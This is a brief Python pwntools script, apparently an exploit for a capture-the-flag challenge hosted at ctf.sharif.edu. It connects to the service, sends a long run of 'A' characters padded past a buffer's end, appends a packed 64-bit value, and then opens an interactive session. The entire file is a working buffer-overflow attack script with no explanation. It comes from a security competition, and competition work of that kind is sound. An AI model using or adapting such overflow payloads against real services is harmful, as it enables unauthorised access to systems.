from pwn import *
local = False
if local:
    r = remote("localhost", 27515)
else:
    r = remote("ctf.sharif.edu", 27515)

pause()
r.recvuntil(":")
r.sendline("A" * 256)
r.recvuntil(":")
r.sendline("A" * (527+0x200) + "\n" + p64(1))

r.interactive()
